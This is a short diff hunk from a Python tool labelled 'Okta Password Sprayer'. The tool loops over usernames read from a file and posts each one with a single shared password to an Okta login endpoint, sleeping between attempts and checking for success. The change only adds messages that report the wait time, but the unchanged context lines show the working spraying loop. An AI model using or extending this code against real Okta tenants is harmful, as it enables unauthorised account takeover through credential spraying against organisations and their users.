@@ -30,12 +30,13 @@ print("+"*100)
 print("Okta Password Sprayer")
 print("+"*100)
 password = options.password.strip()
-print("Spraying...")
+print("Spraying...with a wait time of %s..." % options.wait)
 with open ("%s" % options.inputfile, "r") as oktausers:
     for line in oktausers:
         try:
             usr = line.strip()
             data = {"username":"{}".format(usr),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}
+            print("--Waiting %s seconds..." % options.wait)
             time.sleep(sleeptime)
             response = requests.post(url, headers=headers, json=data)
             if response.status_code == 200:
